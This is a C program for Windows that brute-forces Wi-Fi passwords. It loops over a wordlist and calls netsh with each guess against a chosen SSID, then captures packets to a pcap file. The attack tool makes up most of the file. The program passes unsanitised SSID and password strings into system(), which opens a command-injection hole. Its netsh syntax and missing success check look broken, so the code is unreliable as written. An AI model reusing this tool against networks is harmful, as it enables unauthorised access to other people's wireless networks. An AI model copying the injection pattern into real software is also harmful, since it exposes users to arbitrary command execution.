#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>

#define MAX_SSID_LEN 32
#define MAX_PWD_LEN 32
#define MAX_BSSID_LEN 18
#define MAX_WORDLIST_PATH 256

void connect_to_wifi(const char* ssid, const char* pwd) {
    char command[256];
    snprintf(command, sizeof(command), 
             "netsh wlan connect name=\"%s\" ssid=\"%s\" key=\"%s\"", ssid, ssid, pwd);
    system(command);
}

int connect_with_wordlist(const char* ssid, const char* bssid, const char* wordlist_path) {
    FILE *wordlist = fopen(wordlist_path, "r");
    if (wordlist == NULL) {
        fprintf(stderr, "Error opening wordlist file: %s\n", wordlist_path);
        return 1;
    }

    char pwd[MAX_PWD_LEN];
    while (fgets(pwd, sizeof(pwd), wordlist)) {
        pwd[strcspn(pwd, "\n")] = 0; // Remove trailing newline
        connect_to_wifi(ssid, pwd);
        Sleep(5000); // Wait for 5 seconds to check connection
        // Check connection status (simplified approach)
        // In real-world scenario, you should validate whether the connection was established
        printf("Trying password: %s\n", pwd);
    }
    fclose(wordlist);
    return 0;
}

void capture_packets(const char* ssid) {
    pcap_if_t *alldevs, *device;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filename[256];

    // Get the list of available devices
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error finding devices: %s\n", errbuf);
        exit(1);
    }

    // Open the first available device
    device = alldevs;
    if (device == NULL) {
        fprintf(stderr, "No devices found\n");
        exit(1);
    }

    // Open the device for capturing
    handle = pcap_open_live(device->name, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error opening device: %s\n", errbuf);
        pcap_freealldevs(alldevs);
        exit(1);
    }

    // Create the filename for the pcap file
    snprintf(filename, sizeof(filename), "%s.pcap", ssid);

    // Open the pcap file for writing
    pcap_dumper_t *dumper = pcap_dump_open(handle, filename);
    if (dumper == NULL) {
        fprintf(stderr, "Error opening output file: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        pcap_freealldevs(alldevs);
        exit(1);
    }

    // Capture packets and write them to the file
    struct pcap_pkthdr header;
    const u_char *packet;
    int packet_count = 0;

    while (packet_count < 100) { // Capture 100 packets
        packet = pcap_next(handle, &header);
        if (packet != NULL) {
            pcap_dump((u_char*) dumper, &header, packet);
            packet_count++;
        }
    }

    // Clean up
    pcap_dump_close(dumper);
    pcap_close(handle);
    pcap_freealldevs(alldevs);
}

int main() {
    char mode[3];
    char ssid[MAX_SSID_LEN];
    char pwd[MAX_PWD_LEN];
    char bssid[MAX_BSSID_LEN];
    char wordlist_path[MAX_WORDLIST_PATH];

    printf("Choose mode (MC for manual connect, BF for brute force): ");
    fgets(mode, sizeof(mode), stdin);
    mode[strcspn(mode, "\n")] = 0; // Remove trailing newline

    if (strcmp(mode, "MC") == 0) {
        printf("ENTER SSID: ");
        fgets(ssid, MAX_SSID_LEN, stdin);
        ssid[strcspn(ssid, "\n")] = 0; // Remove trailing newline

        printf("ENTER PWD: ");
        fgets(pwd, MAX_PWD_LEN, stdin);
        pwd[strcspn(pwd, "\n")] = 0; // Remove trailing newline

        connect_to_wifi(ssid, pwd);
        Sleep(5000); // Wait for 5 seconds to ensure connection
    } else if (strcmp(mode, "BF") == 0) {
        printf("ENTER SSID: ");
        fgets(ssid, MAX_SSID_LEN, stdin);
        ssid[strcspn(ssid, "\n")] = 0; // Remove trailing newline

        printf("ENTER BSSID: ");
        fgets(bssid, MAX_BSSID_LEN, stdin);
        bssid[strcspn(bssid, "\n")] = 0; // Remove trailing newline

        printf("ENTER WORDLIST: ");
        fgets(wordlist_path, MAX_WORDLIST_PATH, stdin);
        wordlist_path[strcspn(wordlist_path, "\n")] = 0; // Remove trailing newline

        connect_with_wordlist(ssid, bssid, wordlist_path);
    } else {
        fprintf(stderr, "Invalid mode selected\n");
        return 1;
    }

    capture_packets(ssid);

    return 0;
}
